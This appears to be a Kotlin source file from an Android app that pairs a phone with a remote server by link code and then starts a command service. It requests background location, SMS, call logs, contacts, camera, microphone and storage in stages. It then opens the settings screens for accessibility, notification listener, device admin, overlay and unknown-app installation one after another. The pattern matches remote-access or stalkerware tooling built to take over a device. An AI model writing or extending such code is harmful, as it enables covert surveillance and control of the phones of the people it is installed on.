package com.abuzahra.manager

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.service.CommandService
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class LinkActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "LinkActivity"
        private const val PERM_REQUEST_BASIC = 2001
        private const val PERM_REQUEST_LOCATION = 2002
        private const val PERM_REQUEST_CONTACTS_SMS = 2003
        private const val PERM_REQUEST_CAMERA_MEDIA = 2004
        private const val PERM_REQUEST_STORAGE = 2005
    }

    private var currentPermissionGroup = 0
    private lateinit var textStatus: TextView
    private lateinit var btnLink: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // If already linked, go to main
        if (DeviceUtils.isLinked(this)) {
            startActivity(Intent(this, MainActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_link)

        val editCode = findViewById<EditText>(R.id.editCode)
        val editServer = findViewById<EditText>(R.id.editServer)
        btnLink = findViewById<Button>(R.id.btnLink)
        textStatus = findViewById<TextView>(R.id.textStatus)
        val textDeviceId = findViewById<TextView>(R.id.textDeviceId)

        // Show device ID
        textDeviceId.text = "Device ID: ${DeviceUtils.getDeviceId(this)}"

        // Show current server
        editServer.setHint("Server URL (optional)")
        editServer.setText(Config.SERVER_DOMAIN)

        // Request first permission group on launch
        requestNextPermissionGroup()

        btnLink.setOnClickListener {
            val code = editCode.text.toString().trim()
            val server = editServer.text.toString().trim()

            if (code.isBlank()) {
                Toast.makeText(this, "Enter link code", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            // Update server if provided
            if (server.isNotBlank() && server != Config.SERVER_DOMAIN) {
                Config.SERVER_DOMAIN = server
                Config.SERVER_PORT = if (server.startsWith("https://")) 443 else 80
                DeviceUtils.saveServerInfo(this, server, Config.SERVER_PORT)
            }

            btnLink.isEnabled = false
            textStatus.text = "Connecting to server..."
            editCode.setText(code.uppercase())

            lifecycleScope.launch {
                try {
                    // First test server connectivity
                    textStatus.text = "Testing server connection..."
                    val canConnect = ApiClient.testHealth()
                    if (!canConnect) {
                        textStatus.text = "Cannot connect to server!\nCheck server URL: ${Config.SERVER_DOMAIN}\nMake sure the server is running."
                        btnLink.isEnabled = true
                        return@launch
                    }

                    textStatus.text = "Server OK, linking device..."

                    val result = ApiClient.linkDevice(this@LinkActivity, code.uppercase())
                    if (result.ok || result.success) {
                        textStatus.text = "Linked successfully!\n${result.message}"
                        Toast.makeText(this@LinkActivity, "Device linked!", Toast.LENGTH_SHORT).show()

                        // Request remaining permissions before starting service
                        requestAllRemainingPermissions()

                        // Start foreground service
                        CommandService.start(this@LinkActivity)

                        // Navigate to main activity after delay
                        delay(1500)
                        startActivity(Intent(this@LinkActivity, MainActivity::class.java))
                        finish()
                    } else {
                        textStatus.text = "Failed: ${result.error}"
                        btnLink.isEnabled = true
                        Toast.makeText(this@LinkActivity, result.error, Toast.LENGTH_LONG).show()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Link error", e)
                    val errorMsg = e.message ?: "Unknown error"
                    if (errorMsg.contains("BEGIN_OBJECT") || errorMsg.contains("NUMBER")) {
                        textStatus.text = "Server returned invalid response!\nMake sure server URL is correct.\nCurrent: ${Config.SERVER_DOMAIN}"
                    } else if (errorMsg.contains("Connection refused") || errorMsg.contains("Failed to connect") || errorMsg.contains("timed out")) {
                        textStatus.text = "Cannot connect to server!\n${Config.SERVER_DOMAIN}\nIs the server running?"
                    } else if (errorMsg.contains("SSL") || errorMsg.contains("certificate")) {
                        textStatus.text = "SSL Error: $errorMsg"
                    } else if (errorMsg.contains("non-JSON") || errorMsg.contains("HTML")) {
                        textStatus.text = "Server error: $errorMsg"
                    } else {
                        textStatus.text = "Error: $errorMsg"
                    }
                    btnLink.isEnabled = true
                    Toast.makeText(this@LinkActivity, "Connection failed: ${errorMsg.take(100)}", Toast.LENGTH_LONG).show()
                }
            }
        }

        // Add "Request All Permissions" button dynamically
        val parentLayout = findViewById<LinearLayout>(R.id.linkRootLayout) ?: findViewById<LinearLayout>(android.R.id.content)
        addPermissionsButton(parentLayout)
    }

    private fun addPermissionsButton(parent: LinearLayout) {
        val btnPerms = Button(this).apply {
            text = "Grant All Permissions"
            textSize = 13f
            setPadding(16, 12, 16, 12)
            setBackgroundColor(0xFF1a1a2e.toInt())
            setTextColor(0xFF60a5fa.toInt())
            setOnClickListener {
                requestAllRemainingPermissions()
            }
        }
        val params = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        params.topMargin = 24
        btnPerms.layoutParams = params

        // Add before the status text
        val statusIndex = indexOfChild(textStatus, parent)
        if (statusIndex >= 0) {
            parent.addView(btnPerms, statusIndex)
        } else {
            parent.addView(btnPerms)
        }
    }

    private fun indexOfChild(view: TextView, parent: LinearLayout): Int {
        for (i in 0 until parent.childCount) {
            if (parent.getChildAt(i) === view) return i
        }
        return -1
    }

    // ===== PROGRESSIVE PERMISSION REQUESTS =====

    /**
     * Permission groups - requested progressively because Android limits
     * the number of permissions per request and shows a system dialog
     * that must be dismissed before the next group.
     */
    private val permissionGroups = listOf(
        // Group 0: Basic permissions (auto-granted on most devices)
        listOf(
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.VIBRATE,
            Manifest.permission.BLUETOOTH,
            Manifest.permission.BLUETOOTH_ADMIN,
            Manifest.permission.BLUETOOTH_CONNECT,
        ),
        // Group 1: Location
        listOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        ),
        // Group 2: Contacts & SMS
        listOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALENDAR,
            Manifest.permission.CALL_PHONE,
        ),
        // Group 3: Camera & Media
        listOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
        ),
        // Group 4: Storage (varies by API level)
        emptyList<String>() // Filled dynamically below
    )

    private fun getStoragePermissions(): List<String> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            listOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.POST_NOTIFICATIONS,
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            listOf(
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.MANAGE_EXTERNAL_STORAGE,
            )
        } else {
            listOf(
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
            )
        }
    }

    private fun getPermissionsForGroup(groupIndex: Int): List<String> {
        val group = when (groupIndex) {
            0 -> permissionGroups[0]
            1 -> permissionGroups[1]
            2 -> permissionGroups[2]
            3 -> permissionGroups[3]
            4 -> getStoragePermissions()
            else -> return emptyList()
        }

        return group.filter {
            // Only request permissions that are declared in manifest
            try {
                packageManager.getPermissionInfo(it, 0)
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            } catch (e: PackageManager.NameNotFoundException) {
                false // Not declared in manifest
            }
        }
    }

    private fun requestNextPermissionGroup() {
        // Skip basic group (0) - those are auto-granted, start from group 1
        val startGroup = if (currentPermissionGroup == 0) 1 else currentPermissionGroup

        for (i in startGroup until 5) {
            val perms = getPermissionsForGroup(i)
            if (perms.isNotEmpty()) {
                currentPermissionGroup = i + 1
                val requestCode = when (i) {
                    0 -> PERM_REQUEST_BASIC
                    1 -> PERM_REQUEST_LOCATION
                    2 -> PERM_REQUEST_CONTACTS_SMS
                    3 -> PERM_REQUEST_CAMERA_MEDIA
                    4 -> PERM_REQUEST_STORAGE
                    else -> PERM_REQUEST_BASIC
                }
                Log.d(TAG, "Requesting permission group $i: ${perms.joinToString()}")
                ActivityCompat.requestPermissions(this, perms.toTypedArray(), requestCode)
                return
            }
        }
        // All runtime permissions requested, now request special permissions
        requestSpecialPermissions()
    }

    private fun requestAllRemainingPermissions() {
        // Request all ungranted runtime permissions at once
        val allPerms = mutableListOf<String>()

        for (i in 0 until 5) {
            allPerms.addAll(getPermissionsForGroup(i))
        }

        if (allPerms.isNotEmpty()) {
            // Take up to 10 at a time (Android system limitation)
            val batch = allPerms.take(10)
            Log.d(TAG, "Requesting batch of ${batch.size} permissions")
            ActivityCompat.requestPermissions(this, batch.toTypedArray(), PERM_REQUEST_BASIC)
        } else {
            // All runtime permissions granted, request special ones
            requestSpecialPermissions()
        }
    }

    private fun requestSpecialPermissions() {
        // Battery optimization
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")
                )
                startActivity(intent)
            } catch (_: Exception) {}
        }

        // System alert window (draw over other apps)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    val intent = Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }

        // Package usage stats (screen time)
        try {
            val appUsageIntent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            startActivity(appUsageIntent)
        } catch (_: Exception) {}

        // Write settings
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.System.canWrite(this)) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }

        // Notification access (for reading notifications)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            try {
                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                startActivity(intent)
            } catch (_: Exception) {}
        }

        // Device admin
        try {
            val deviceAdminIntent = Intent(Settings.ACTION_SECURITY_SETTINGS)
            startActivity(deviceAdminIntent)
        } catch (_: Exception) {}

        // Accessibility service
        try {
            val accessibilityIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(accessibilityIntent)
        } catch (_: Exception) {}

        // Install unknown apps (for app installation)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            } catch (_: Exception) {}
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        val granted = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
        val total = grantResults.size

        if (granted > 0) {
            Log.d(TAG, "Permissions granted: $granted/$total for requestCode=$requestCode")
        }

        // Check if there are more groups to request
        lifecycleScope.launch {
            delay(300) // Small delay before requesting next group
            requestNextPermissionGroup()
        }
    }
}
